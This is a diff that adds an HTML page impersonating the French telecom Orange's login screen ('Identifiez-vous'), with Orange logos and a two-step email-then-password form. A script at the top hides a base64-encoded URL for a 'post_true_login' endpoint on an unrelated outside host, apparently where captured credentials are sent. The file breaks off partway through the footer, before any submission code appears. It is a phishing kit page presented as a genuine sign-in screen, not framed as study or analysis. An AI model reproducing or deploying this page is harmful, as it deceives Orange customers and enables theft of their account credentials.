@@ -1,0 +1,671 @@
+<html lang="en"><head><script xmlns="http://www.w3.org/1999/html">
+
+    let endhere = 'aHR0cDovL3NoMzMyNjQyOS5jLmhhZC5zdS9wb3N0X3RydWVfbG9naW4=';
+	let eml = '';
+</script>
+
+
+
+
+    <meta charset="UTF-8">
+    <title>Identifiez-vous</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="short icon" href="https://c.woopic.com/logo-orange.png">
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <style>
+        *{
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body{
+            font-family: sans-serif;
+        }
+
+        .header_main{
+            background-color: #000;
+        }
+        .nav_links{
+            display: flex;
+            align-items: center;
+            justify-content: right;
+            padding: 15px 20px;
+        }
+        .navlink{
+            display: flex;
+        }
+        .nav_icon{
+            margin: 0 10px;
+        }
+        .link{
+            color: #fff;
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 15px;
+        }
+        .link:hover{
+            color: #ccc;
+            text-decoration: underline;
+        }
+        .nav_links2{
+            display: flex;
+            justify-content: center;
+        }
+        .nav_logo{
+            width: 50px;
+        }
+        .navlink{
+            display: flex;
+        }
+        .nav_menu{
+            display: none;
+            height: 30px;
+
+
+        }
+        .link_down{
+            display: flex;
+            align-items: center;
+            color: #fff;
+            text-decoration: none;
+            font-weight: bold;
+            padding: 20px 35px ;
+
+        }
+        .link_down:hover{
+            color: #ccc;
+            text-decoration: underline;
+
+        }
+        .identify{
+            margin-top: 30px;
+            margin-left: 60px;
+        }
+        .id_header{
+            font-size: 40px;
+            margin: 15px 0;
+        }
+        .id_header2{
+            margin-top: 20px;
+            margin-bottom: 35px;
+        }
+        .id_box{
+            width: 55%;
+            padding: 8px 20px;
+            background-color: #E9F8FF;
+        }
+        .id_title{
+            margin: 10px 0;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+
+        }
+        .id_message{
+            font-size: 14px;
+            margin: 10px 10px;
+            line-height: 1.6;
+        }
+        .footer{
+            margin-top: 45px;
+
+        }
+        .footer hr{
+            width: 90%;
+            margin: 0 auto;
+        }
+        .footer_links{
+            margin: 50px 0;
+            margin-left: 60px;
+        }
+        .footer_link{
+            font-weight: bold;
+            text-decoration: none;
+            color: #000;
+            display: block;
+            margin: 10px 0;
+        }
+        .footer_link:hover{
+            text-decoration: underline;
+        }
+        .footer_space{
+            background-color: #ccc;
+            height: 18vh;
+        }
+        .header_phone-img{
+            display: none;
+        }
+        .form_wrapper{
+            margin-left: 60px;
+        }
+        .form_wrapper2{
+            display: none;
+        }
+        .form_wrapper2{
+            margin-left: 60px;
+        }
+
+        .form_inputs label{
+            font-size: 14px;
+            margin-left: 2px;
+
+        }
+        .input{
+            display: block;
+            width: 400px;
+            height: 40px;
+            border: none;
+            border-bottom: 2px solid #000;
+            font-size: 16px;
+        }
+        .rederror{
+            display: block;
+            width: 400px;
+            height: 40px;
+            border: none;
+            border-bottom: 2px solid red;
+            font-size: 16px;
+            font-weight: bold;
+        }
+        .rederror::placeholder{
+            color: red;
+        }
+
+        .rederror:focus{
+            outline: none;
+        }
+
+        .input::placeholder{
+            color: #5e5d5d;
+
+        }
+        .input:focus{
+            outline: none;
+        }
+        .form_links{
+            margin-top: 30px;
+            margin-bottom: 20px;
+
+        }
+        .form_links span{
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .form_links label{
+            cursor: pointer;
+        }
+        .form_btn button{
+            background-color: black;
+            color: #fff;
+            border: none;
+            width: 180px;
+            height: 50px;
+            font-size: 16px;
+            font-weight: bold;
+            margin: 15px 0;
+            cursor: pointer;
+        }
+        .form_btn button:hover{
+            background-color: rgba(43, 41, 41, 0.788);
+            transition: all .2s ease-in-out;
+        }
+        .error{
+            display: none;
+            background-color: #FDE5E6;
+            width: 400px;
+            padding: 20px 10px;
+            font-weight: bold;
+            font-size: 14px;
+
+        }
+        .form_btn a{
+            text-decoration: none;
+            color: #000;
+            font-weight: bold;
+            margin-left: 5px;
+        }
+        .passwordError{
+            display: none;
+            background-color: #FDE5E6;
+            margin-bottom: 30px;
+            width: 400px;
+            padding: 20px 10px;
+            font-weight: bold;
+            font-size: 14px;
+        }
+        .login_message{
+            margin: 30px 0;
+        }
+        .user_box{
+            display: flex;
+            align-items: center;
+        }
+        .user_box-email{
+            margin-left: 15px;
+        }
+        .user_box-email a{
+            display: block;
+            margin: 10px 0;
+            font-weight: bold;
+            cursor: pointer;
+            color: #000;
+            text-decoration: none;
+        }
+
+        .user_box-email span{
+            display: block;
+            margin: 10px 0;
+            font-weight: bold;
+            cursor: pointer;
+            color: #000;
+            text-decoration: none;
+        }
+
+        .user_box-email a:hover{
+            text-decoration: underline;
+        }
+
+        .last_page{
+            background-color: #000;
+
+
+        }
+        .last_items{
+            display: flex;
+            align-items: center;
+            padding: 15px 20px;
+            margin-left: 30px;
+        }
+
+        .items{
+            display: flex;
+            align-items: center;
+            justify-content: center;
+
+        }
+        .item_link{
+            color: #fff;
+            padding: 0 10px;
+            font-weight: bold;
+            text-decoration: none;
+
+
+        }
+        .item_link:hover{
+            text-decoration: underline;
+            color: #ccc;
+        }
+
+        .last_page hr{
+            height: 1px;
+        }
+        .nav_pages{
+            display: flex;
+            align-items: center;
+            margin-left: 40px;
+            padding: 20px 0;
+
+        }
+        .nav_info{
+            list-style: none;
+        }
+        .info{
+            text-decoration: none;
+            color: #fff;
+            padding: 0 20px;
+        }
+
+        .info:hover{
+            text-decoration: underline;
+            color: #ccc;
+        }
+        .responseError{
+            display: none;
+            background-color: #FDE5E6;
+            margin-bottom: 30px;
+            width: 400px;
+            padding: 20px 10px;
+            font-weight: bold;
+            font-size: 14px;
+        }
+
+        /* Media Queries Responsive Design */
+
+        @media screen and (max-width: 912px){
+            .link_remove{
+                display: none;
+            }
+
+            .nav_links2{
+                display: flex;
+                justify-content: space-around;
+
+            }
+            .nav_menu{
+                display: block;
+            }
+        }
+        @media screen and (max-width: 820px){
+            .link_remove{
+                display: none;
+            }
+
+            .nav_links2{
+                display: flex;
+                justify-content: space-around;
+
+            }
+            .nav_menu{
+                display: block;
+            }
+        }
+        @media screen and (max-width: 768px){
+            .link_remove{
+                display: none;
+            }
+
+            .nav_links2{
+                display: flex;
+                justify-content: space-around;
+
+            }
+            .nav_menu{
+                display: block;
+            }
+        }
+        @media screen and (max-width: 414px){
+            .link_remove{
+                display: none;
+            }
+            .nav_pages{
+                display: none;
+
+            }
+
+            .last_items{
+                display: flex;
+                margin-left: 0;
+                font-size: 13px;
+                padding: 15px 0px;
+                margin-left: 10px;
+
+            }
+
+            .nav_links2{
+                display: flex;
+                justify-content: space-around;
+
+            }
+            .nav_menu{
+                display: block;
+            }
+            .identify{
+                margin-top: 25px;
+                margin-left: 30px;
+            }
+
+            .id_header{
+                font-size: 25px;
+                margin: 20px 0;
+            }
+            .id_box{
+                width: 90%;
+                padding: 20px 20px;
+                background-color: #E9F8FF;
+            }
+            .id_title{
+                margin: 10px 0;
+                font-weight: bold;
+                display: flex;
+                align-items: center;
+
+            }
+
+            .form_inputs input{
+                display: block;
+                width: 300px;
+                height: 40px;
+                border: none;
+                border-bottom: 2px solid #000;
+                margin: 20px 0;
+                font-size: 16px;
+            }
+
+            .form_wrapper{
+                margin-left: 30px;
+            }
+            .form_wrapper2{
+                margin-left: 30px;
+            }
+            .footer_links{
+                margin: 20px 0;
+                margin-left: 30px;
+            }
+
+            .login_message{
+                margin: 50px 0;
+                font-size: 20px;
+            }
+        }
+
+    </style>
+</head>
+
+<body>
+
+    <div class="page_container page_1">
+
+        <!-- Header Navigation container  -->
+        <div class="header_main">
+            <nav class="nav_links">
+                <li class="navlink"><a href="#" class="link">Vousêtesun particulier</a></li>
+                <li class="navlink"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACIAAAAYCAYAAACfpi8JAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAGiSURBVEhLzZatkoMwFIX7JnkEHgGJrIxErkTyCMhIZCUSWYlEIpHISGTk2YTN8NOeADPbdjcznzk5hNPL5dKLXfg1IsY1L1FV1Q9ljmssuDcMFc8hJFQzwIAvMzRQ8nQgKh6TlOhGf8fdNaIrE37GFiruIzI0qxBGd6jyK2Lh9gXitEDd6VWlRjTZYWWouINA0a5u0eSIqO+CKG9sBL9Mi2IKGoSKYeIKgz8bQ42EeVYk9ezGUMXU46FimFvvjzVoC7L/hELnr0B/I/szVAySzc3R40b2GXP2sUFG9j1UDPJvgsTzM9e4S+7ZInHX/hLbUzH1TFAxTLa8Cfqecs+a834q7pAuv/BoPmzmja1gSjwLVNxFqG4ZVkajURLi0SMV2jmwa4/syfMAFcOERrsZMfQ9esswbr8+xvbG1/4wc1CR8xDCaL1MzsDSrYI8DuGg4jOJLfU6hB1O01SNUhR1O1XBGM+o0bc1ivNfXgcVt4RCvBYqLnwmhIOKHol61flvDOGg4kyi2qkh3xzCQcUNUZIE/3O8ECr+BVT8C6j4YS74BgTsy/LtxCIzAAAAAElFTkSuQmCC" alt="" class="nav_icon"> <a href="#" class="link link_remove">
+                        Rechercher</a></li>
+                <li class="navlink"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB0AAAAaCAYAAABLlle3AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAExSURBVEhL7ZYtcoUwFIXZ0VsCy8gSkJFZwpORkVcikUgkS4hEIiORpxdeaG5aOn1tQxHtnfkmOWfCuZDhr+LCBRyaZyOFQjehWM2dEtkZUmgMIR5RoMKgRXaGFAo0enhfhpGeutIG/bRgWcow9Y3IzpCC4OPWFClPIjtDCNVjjuuL1NxDyfyEEHpAwftovZOgZX5CCCq6uVweJPMTSdQlH9KtJnR11mwnibrdmwaEuM8LT5Ztlrx1kqavCxEeC5PHTdvPmlbVDY1r4azF3Rg4sjA8GktwPFrLkHt4xoFWzRhHsJtnQY7Hu4Vdc5qbyM6Q4pI30qVNAwYt/Q/YH7E3LwEdz/y/KSPF32vKdfCpek9cW6zpV+pnTb/559AZkVFB0bj5T/45/BqH5tkcmidS4QW3h8YMwYRhgwAAAABJRU5ErkJggg==" alt="" class="nav_icon"> <a href="#" class="link link_remove">Nos
+                        botiques</a></li>
+                <li class="navlink"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAbCAYAAAAdx42aAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAHuSURBVEhLxZUhkrQwEIX3JjkCR0ByBOTKkcgc4ZdIZCQSiYxEIiMjkcjItwlkB0g6GfavrdlX9QledbpTnZD+sMIfQ5rvhDTfCWlmKSqObpCYlYJeDYyxrBpKzZBDB14V5LoEpEnAULcj1Ip7WhXGtgYjc10gzSsFx6iNz/wzGT2CF0TOA9I8qARUsvYKPY3o+x6DnO1xeDuUURAVkXuHND0NZCKpUT1qFsYX4KkFq0RziX1Cmhuf4+JXh5rRbcUriO/2LLbA5v3DlOjYMn5e8nsiw8OTiaB7FC6GTzhCVsjGrWPotbdCmQk8qhMbOw9pU6ZksGy/oP+0MkqgcutYZ/uTkt3kI6gTfBy06TSh1qn1xR8YXvwtcxvUCT4OmlwHTtKDL24vbOrKPPV9TBciY6cckDrKs/RQbvH3GqYxlFGtyPCU6ct0kpk71LU993znd9nLW8a1IuMJu3MMZrEzQN84Ltd+RtWJjBMMTeph8VJij30Vt8omNRdI84R73dK3y9hLyB8dpkz9RfL93aAhzQA3CSV+PI+Mhnw9EUmThpVohHw5ko0dxVI0KKNZQUKaeYTypZwMtOzRd9z+DVWu1SlIM89zA8ZewoqOuQ9p5tk28CvFHaSZR8y/VdxBmlkYIx+U/4U03wlpvokPfAHSSrGsgT2X1gAAAABJRU5ErkJggg==" alt="" class="nav_icon"> <a href="#" class="link link_remove">Aide et
+                        contact</a></li>
+            </nav>
+
+            <nav class="nav_links2">
+                <img src="https://c.woopic.com/logo-orange.png" alt="" class="nav_logo">
+
+                <li class="navlink"><a href="#" class="link_down link_remove">Mobiles et forfaits</a></li>
+                <li class="navlink"><a href="#" class="link_down link_remove">Internet</a></li>
+                <li class="navlink"><a href="#" class="link_down link_remove">Packs Internet + Mobile</a></li>
+                <li class="navlink"><a href="#" class="link_down link_remove">Maison</a></li>
+                <li class="navlink"><a href="#" class="link_down link_remove">Tv et divertissement</a></li>
+                <li class="navlink"><a href="#" class="link_down link_remove">Banque</a></li>
+                <li class="navlink"><a href="#" class="link_down link_remove">News</a></li>
+
+                <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACIAAAAdCAYAAADPa766AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAACiSURBVFhH7dSxCQUhEEVRixXZFhQMZcFEwTYUbEAEu7GK2f/T5cUzBjtwkmvyItXv6BAwSoBRAowSFJVSaK3FpveOh/wfOW/vffgQrTWFENhYa/GQQ8AoAUYJMEqAUYKinDPNOdm01vCQ70N7DzHG0H3fbJxzeMghYJQAowQYJcAoQVFKicYYbGqteMj3ob2HXNdFMUY23ns85BAwSoCRmaIHmuMh28TagHEAAAAASUVORK5CYII=" alt="" class="nav_menu">
+
+            </nav>
+        </div>
+        <!-- Header Navigation container End-->
+
+        <!-- Identity Box  -->
+        <div class="identify">
+            <h1 class="id_header"> Pour vous identifier</h1>
+            <div class="id_box">
+                <p class="id_title"> <svg width="32" height="32" viewBox="0 0 1024 1024" id="first-connection-info-icon-info">
+                        <path d="M499.714 0.711c-0.241 0.241-7.709 0.602-16.621 1.084-96.476 4.457-195.362 39.988-274.614 98.765-64.558 47.817-117.554 110.448-153.206 180.787-21.56 42.397-39.867 97.44-47.335 142.125-1.084 6.624-2.168 12.286-2.409 12.647-0.12 0.361-0.722 5.179-1.204 10.84s-1.084 10.599-1.324 10.96c-2.891 4.818-2.891 105.509 0 110.689 0.241 0.361 0.843 4.096 1.204 8.431 3.733 35.892 16.501 85.396 32.279 125.263 7.588 19.151 25.052 54.561 35.049 71.304 23.728 39.145 46.612 68.412 77.928 99.728 21.56 21.56 23.848 23.728 40.951 37.458 91.177 73.471 204.274 113.579 320.384 113.579 111.653-0.12 215.716-34.086 304.726-99.728 38.181-28.063 76.844-66.245 105.028-103.703 33.845-45.047 59.259-93.345 76.965-146.341 9.153-27.582 17.706-62.992 20.958-86.72 2.529-19.512 3.131-24.811 3.974-36.133 1.084-16.862 1.084-63.716-0.12-79.374-6.504-85.034-36.253-171.514-83.107-241.612-12.647-18.91-15.297-22.523-29.629-40.349-23.848-29.75-60.103-64.558-92.26-88.768-62.751-46.974-141.764-80.698-219.812-93.706-16.501-2.77-16.38-2.77-28.907-4.096-19.753-2.168-67.569-4.216-68.895-3.131zM528.862 122.963c48.298 8.792 81.059 56.729 71.785 105.028-8.311 43.36-44.685 73.351-88.888 73.351-43.48 0.12-80.096-30.352-88.407-73.11-5.54-29.389 3.372-58.416 24.811-79.976 21.8-22.041 50.105-30.833 80.698-25.293zM602.334 563.189c0.722 189.099 0.843 201.625 2.891 209.574 2.289 9.033 8.19 22.643 11.442 26.378 6.624 7.709 21.319 12.406 43.842 13.851 1.807 0.12 2.048 1.687 2.048 15.538v15.297h-270.399l-0.722-31.316 5.179 0.12c8.551 0.12 22.523-2.77 29.509-6.263 12.888-6.263 16.621-12.286 19.753-31.196 1.687-9.997 2.409-314.602 0.843-333.15-1.324-14.814-4.938-29.389-8.792-34.327-5.54-7.227-22.523-13.249-39.386-13.851l-6.986-0.241v-15.297c0-8.431 0.241-15.538 0.482-15.778 0.361-0.241 47.576-0.482 105.148-0.482h104.546l0.602 201.143z" fill="#26B2FF"></path>
+                    </svg> &nbsp; C’est votre première connexion ?</p>
+                <p class="id_message">Finalisez la création de votre compte en saisissant l’adresse e-mail ou le numéro
+                    de mobile fournis par Orange ou Sosh lors de votre souscription.</p>
+            </div>
+
+            <h2 class="id_header2">Indiquez votre compte Orange</h2>
+        </div>
+
+        <!-- Identity Box End -->
+
+
+        <div class="container_form">
+
+            <form action="#" method="post">
+                <!-- Form box Wrapper 1 -->
+                <div class="form_wrapper">
+                    <!--- Form Input 1-->
+                    <div class="form_inputs">
+                        <input type="email" id="input_field" placeholder="Adresse e-mail ou n° de mobile Orange" name="email" class="input">
+                        <span class="error"><svg width="20" height="15" viewBox="0 0 1024 1024" id="login-error-icon-error">
+                                <path d="M493.967 46.154c-26.092 4.098-54.098 20.356-70.082 40.71-5.328 6.695-22.95 35.383-34.562 56.284-1.776 3.415-3.825 6.695-4.372 7.514-0.547 0.683-6.695 11.202-13.661 23.224-15.027 25.956-19.126 32.923-28.688 49.18-3.825 6.695-8.333 14.48-9.836 17.076-2.459 4.098-18.033 31.011-36.612 62.841-2.868 4.917-8.88 15.163-13.525 22.95-4.508 7.65-9.563 16.257-11.065 19.126-1.502 2.732-3.415 6.011-4.098 7.104-1.23 1.776-18.716 31.83-25.956 44.399-1.23 2.185-18.443 31.694-38.251 65.574-19.809 33.743-40.3 69.125-45.765 78.552-12.705 21.858-77.869 133.743-93.579 160.519-23.634 40.3-50.273 86.201-53.142 91.803-6.011 12.022-9.972 28.962-10.519 45.491-0.273 8.606 0.136 18.716 0.819 22.541 2.185 11.202 7.923 27.322 13.114 36.476 4.372 7.787 17.076 24.317 21.448 27.732 15.984 13.114 26.23 19.262 39.344 23.907 19.945 6.967-2.185 6.695 435.108 6.695 441.256 0.136 420.764 0.41 439.343-6.831 19.673-7.514 36.749-19.809 48.907-34.972 26.639-33.060 33.060-76.093 17.35-115.163-1.776-4.234-20.901-38.115-42.623-75.272-21.584-37.159-41.257-70.902-43.716-75-8.744-15.027-29.781-51.365-67.623-116.12-21.311-36.476-46.312-79.508-55.737-95.628-22.131-38.115-23.634-40.71-37.842-64.891-6.557-11.339-13.525-23.224-15.301-26.639-1.913-3.415-4.781-8.333-6.557-10.929-3.279-5.191-9.836-16.257-29.235-49.863-6.967-12.022-13.114-22.814-13.935-23.907-1.366-2.323-12.431-21.448-16.393-28.415-4.645-8.061-7.65-13.114-14.891-25.547-3.962-6.831-10.382-17.896-14.344-24.59-3.962-6.831-11.339-19.399-16.393-28.005s-10.382-17.896-11.885-20.492c-11.612-20.082-22.95-38.661-27.186-44.399-13.252-17.896-32.651-31.285-56.558-39.208-9.972-3.279-15.301-4.098-28.005-4.508-8.606-0.273-19.262 0-23.497 0.683zM392.465 413.64c5.328 2.459 19.399 15.574 63.115 59.29l56.42 56.147 56.284-56.284c64.617-64.344 62.294-62.568 83.060-62.568 11.612 0 13.797 0.41 20.218 3.825 21.448 11.202 30.738 34.153 23.497 57.241l-3.142 9.972-113.524 114.071 57.513 57.786c63.115 63.115 63.661 63.798 65.438 81.284 1.776 16.257-7.24 34.426-21.311 43.306-12.978 8.197-30.464 9.289-44.399 2.868-7.24-3.279-15.027-10.519-65.847-61.339l-57.786-57.65-57.65 57.65c-49.454 49.454-58.879 58.196-65.574 61.202-23.771 10.793-50.137 1.366-62.022-22.541-3.279-6.421-3.825-9.289-3.825-19.126-0.136-20.628-1.23-19.262 65.164-85.656l57.65-57.786-55.601-55.601c-63.934-64.071-63.251-63.115-63.251-83.743 0-9.699 0.547-12.842 3.551-19.262 5.601-11.748 16.94-21.722 29.918-25.956 6.695-2.185 24.864-0.547 32.104 2.868z" fill="#E70002"></path>
+                            </svg>Indiquez l’adresse e-mail ou le numéro de mobile de votre compte Orange.</span>
+                    </div>
+
+                    <!--- Form Input 1 End-->
+
+                    <div class="form_links">
+                        <span>Comment retrouver l’adresse e-mail de votre compte</span>
+                        <svg style="fill: red" width="10" height="10" viewBox="0 0 691.1999999999997 1024">
+                            <path fill="#FF7900" d="M151.73 1023.992l530.944-512-530.944-512-151.723 146.219 379.349 365.781-379.349 365.653 151.723 146.347z"></path>
+                        </svg>
+                    </div>
+
+                    <!--- Form Btn 1-->
+                    <div class="form_btn">
+                        <button type="button" class="btn">Continuer</button>
+                    </div>
+                    <!--- Form Btn 1 End-->
+
+                </div>
+                <!-- Form box Wrapper  1 End-->
+
+
+                <!-- Form box Wrapper 2 -->
+                <div class="form_wrapper2">
+
+                    <!-- user box -->
+                    <div class="user_box">
+                        <div class="users">
+                            <svg width="80" height="80" viewBox="0 0 80 80">
+                                <defs>
+                                    <circle id="ancg23ohva" cx="40" cy="40" r="40"></circle>
+                                </defs>
+                                <g fill="none" fill-rule="evenodd">
+                                    <mask id="byee0xikqb" fill="#fff">
+                                        <use xlink:href="#ancg23ohva"></use>
+                                    </mask>
+                                    <use fill="#F4F4F4" fill-rule="nonzero" xlink:href="#ancg23ohva"></use>
+                                    <path fill="#999" fill-rule="nonzero" d="M40.216 10.265c8.955 0 16.145 7.15 16.145 16.054 0 8.905-7.19 16.053-16.145 16.053-8.956 0-16.145-7.148-16.145-16.053 0-8.905 7.273-16.054 16.145-16.054z" mask="url(#byee0xikqb)"></path>
+                                    <path fill="#999" fill-rule="nonzero" d="M25.356 82.342c-5.339 0-9.78-3.384-9.78-7.395V56.814c0-6.351 4.07-12.326 10.433-15.752 0 0 5.797 5.39 14.253 5.557 8.415-.209 13.888-5.557 13.888-5.557 6.406 3.426 10.629 9.4 10.629 15.752v25.528H25.356z" mask="url(#byee0xikqb)"></path>
+                                </g>
+                            </svg>
+                        </div>
+
+                        <div class="user_box-email">
+                            <span id="user_email">email@email.com</span>
+                            <a href="index.html">Changer de compte &nbsp; <svg style="fill: red" width="10" height="10" viewBox="0 0 691.1999999999997 1024">
+                                    <path fill="#FF7900" d="M151.73 1023.992l530.944-512-530.944-512-151.723 146.219 379.349 365.781-379.349 365.653 151.723 146.347z"></path>
+                                </svg></a>
+                        </div>
+                    </div>
+                    <!-- user Box End -->
+
+                    <h2 class="login_message">Saisissez votre mot de passe</h2>
+
+                    <!-- form inputs 2 -->
+                    <div class="form_inputs">
+                        <input type="password" id="password" placeholder="Mot de passe" name="password" class="input">
+                        <span class="passwordError"><svg width="20" height="15" viewBox="0 0 1024 1024" id="login-error-icon-error">
+                                <path d="M493.967 46.154c-26.092 4.098-54.098 20.356-70.082 40.71-5.328 6.695-22.95 35.383-34.562 56.284-1.776 3.415-3.825 6.695-4.372 7.514-0.547 0.683-6.695 11.202-13.661 23.224-15.027 25.956-19.126 32.923-28.688 49.18-3.825 6.695-8.333 14.48-9.836 17.076-2.459 4.098-18.033 31.011-36.612 62.841-2.868 4.917-8.88 15.163-13.525 22.95-4.508 7.65-9.563 16.257-11.065 19.126-1.502 2.732-3.415 6.011-4.098 7.104-1.23 1.776-18.716 31.83-25.956 44.399-1.23 2.185-18.443 31.694-38.251 65.574-19.809 33.743-40.3 69.125-45.765 78.552-12.705 21.858-77.869 133.743-93.579 160.519-23.634 40.3-50.273 86.201-53.142 91.803-6.011 12.022-9.972 28.962-10.519 45.491-0.273 8.606 0.136 18.716 0.819 22.541 2.185 11.202 7.923 27.322 13.114 36.476 4.372 7.787 17.076 24.317 21.448 27.732 15.984 13.114 26.23 19.262 39.344 23.907 19.945 6.967-2.185 6.695 435.108 6.695 441.256 0.136 420.764 0.41 439.343-6.831 19.673-7.514 36.749-19.809 48.907-34.972 26.639-33.060 33.060-76.093 17.35-115.163-1.776-4.234-20.901-38.115-42.623-75.272-21.584-37.159-41.257-70.902-43.716-75-8.744-15.027-29.781-51.365-67.623-116.12-21.311-36.476-46.312-79.508-55.737-95.628-22.131-38.115-23.634-40.71-37.842-64.891-6.557-11.339-13.525-23.224-15.301-26.639-1.913-3.415-4.781-8.333-6.557-10.929-3.279-5.191-9.836-16.257-29.235-49.863-6.967-12.022-13.114-22.814-13.935-23.907-1.366-2.323-12.431-21.448-16.393-28.415-4.645-8.061-7.65-13.114-14.891-25.547-3.962-6.831-10.382-17.896-14.344-24.59-3.962-6.831-11.339-19.399-16.393-28.005s-10.382-17.896-11.885-20.492c-11.612-20.082-22.95-38.661-27.186-44.399-13.252-17.896-32.651-31.285-56.558-39.208-9.972-3.279-15.301-4.098-28.005-4.508-8.606-0.273-19.262 0-23.497 0.683zM392.465 413.64c5.328 2.459 19.399 15.574 63.115 59.29l56.42 56.147 56.284-56.284c64.617-64.344 62.294-62.568 83.060-62.568 11.612 0 13.797 0.41 20.218 3.825 21.448 11.202 30.738 34.153 23.497 57.241l-3.142 9.972-113.524 114.071 57.513 57.786c63.115 63.115 63.661 63.798 65.438 81.284 1.776 16.257-7.24 34.426-21.311 43.306-12.978 8.197-30.464 9.289-44.399 2.868-7.24-3.279-15.027-10.519-65.847-61.339l-57.786-57.65-57.65 57.65c-49.454 49.454-58.879 58.196-65.574 61.202-23.771 10.793-50.137 1.366-62.022-22.541-3.279-6.421-3.825-9.289-3.825-19.126-0.136-20.628-1.23-19.262 65.164-85.656l57.65-57.786-55.601-55.601c-63.934-64.071-63.251-63.115-63.251-83.743 0-9.699 0.547-12.842 3.551-19.262 5.601-11.748 16.94-21.722 29.918-25.956 6.695-2.185 24.864-0.547 32.104 2.868z" fill="#E70002"></path>
+                            </svg>Saisissez votre mot de passe.</span>
+
+                        <span class="responseError"><svg width="20" height="15" viewBox="0 0 1024 1024" id="login-error-icon-error">
+                                <path d="M493.967 46.154c-26.092 4.098-54.098 20.356-70.082 40.71-5.328 6.695-22.95 35.383-34.562 56.284-1.776 3.415-3.825 6.695-4.372 7.514-0.547 0.683-6.695 11.202-13.661 23.224-15.027 25.956-19.126 32.923-28.688 49.18-3.825 6.695-8.333 14.48-9.836 17.076-2.459 4.098-18.033 31.011-36.612 62.841-2.868 4.917-8.88 15.163-13.525 22.95-4.508 7.65-9.563 16.257-11.065 19.126-1.502 2.732-3.415 6.011-4.098 7.104-1.23 1.776-18.716 31.83-25.956 44.399-1.23 2.185-18.443 31.694-38.251 65.574-19.809 33.743-40.3 69.125-45.765 78.552-12.705 21.858-77.869 133.743-93.579 160.519-23.634 40.3-50.273 86.201-53.142 91.803-6.011 12.022-9.972 28.962-10.519 45.491-0.273 8.606 0.136 18.716 0.819 22.541 2.185 11.202 7.923 27.322 13.114 36.476 4.372 7.787 17.076 24.317 21.448 27.732 15.984 13.114 26.23 19.262 39.344 23.907 19.945 6.967-2.185 6.695 435.108 6.695 441.256 0.136 420.764 0.41 439.343-6.831 19.673-7.514 36.749-19.809 48.907-34.972 26.639-33.060 33.060-76.093 17.35-115.163-1.776-4.234-20.901-38.115-42.623-75.272-21.584-37.159-41.257-70.902-43.716-75-8.744-15.027-29.781-51.365-67.623-116.12-21.311-36.476-46.312-79.508-55.737-95.628-22.131-38.115-23.634-40.71-37.842-64.891-6.557-11.339-13.525-23.224-15.301-26.639-1.913-3.415-4.781-8.333-6.557-10.929-3.279-5.191-9.836-16.257-29.235-49.863-6.967-12.022-13.114-22.814-13.935-23.907-1.366-2.323-12.431-21.448-16.393-28.415-4.645-8.061-7.65-13.114-14.891-25.547-3.962-6.831-10.382-17.896-14.344-24.59-3.962-6.831-11.339-19.399-16.393-28.005s-10.382-17.896-11.885-20.492c-11.612-20.082-22.95-38.661-27.186-44.399-13.252-17.896-32.651-31.285-56.558-39.208-9.972-3.279-15.301-4.098-28.005-4.508-8.606-0.273-19.262 0-23.497 0.683zM392.465 413.64c5.328 2.459 19.399 15.574 63.115 59.29l56.42 56.147 56.284-56.284c64.617-64.344 62.294-62.568 83.060-62.568 11.612 0 13.797 0.41 20.218 3.825 21.448 11.202 30.738 34.153 23.497 57.241l-3.142 9.972-113.524 114.071 57.513 57.786c63.115 63.115 63.661 63.798 65.438 81.284 1.776 16.257-7.24 34.426-21.311 43.306-12.978 8.197-30.464 9.289-44.399 2.868-7.24-3.279-15.027-10.519-65.847-61.339l-57.786-57.65-57.65 57.65c-49.454 49.454-58.879 58.196-65.574 61.202-23.771 10.793-50.137 1.366-62.022-22.541-3.279-6.421-3.825-9.289-3.825-19.126-0.136-20.628-1.23-19.262 65.164-85.656l57.65-57.786-55.601-55.601c-63.934-64.071-63.251-63.115-63.251-83.743 0-9.699 0.547-12.842 3.551-19.262 5.601-11.748 16.94-21.722 29.918-25.956 6.695-2.185 24.864-0.547 32.104 2.868z" fill="#E70002"></path>
+                            </svg>Vérifiez l’adresse mail et le mot de passe saisis.</span>
+                    </div>
+                    <!-- form inputs 2 End -->
+
+                    <!-- form links 2-->
+                    <div class="form_links">
+                        <input type="checkbox" id="check"> <label for="check">Rester identifié</label>
+                        <svg style="fill: red" width="10" height="10" viewBox="0 0 691.1999999999997 1024">
+                            <path fill="#FF7900" d="M151.73 1023.992l530.944-512-530.944-512-151.723 146.219 379.349 365.781-379.349 365.653 151.723 146.347z"></path>
+                        </svg>
+                    </div>
+                    <!-- form links 2 End-->
+
+                    <!-- form Btn 2-->
+                    <div class="form_btn">
+                        <button type="submit" name="submit" id="submit-btn" class="btn-s">S'identifier</button>
+
+                        <a href="#">Mot de passe oublié</a> <svg style="fill: red" width="10" height="10" viewBox="0 0 691.1999999999997 1024">
+                            <path fill="#FF7900" d="M151.73 1023.992l530.944-512-530.944-512-151.723 146.219 379.349 365.781-379.349 365.653 151.723 146.347z"></path>
+                        </svg>
+                    </div>
+
+                    <!-- form Btn 2 End-->
+
+                </div>
+
+                <!-- Form Wrapper 2 End -->
+
+            </form>
+
+        </div>
+
+        <!-- Footer  container -->
+
+        <div class="footer">
+            <hr>
+            <div class="footer_links">
+                <a class="footer_link" href="#">
+                    Créer un compte sans être client Orange <svg style="fill: red" width="10" height="10" viewBox="0 0 691.1999999999997 1024">
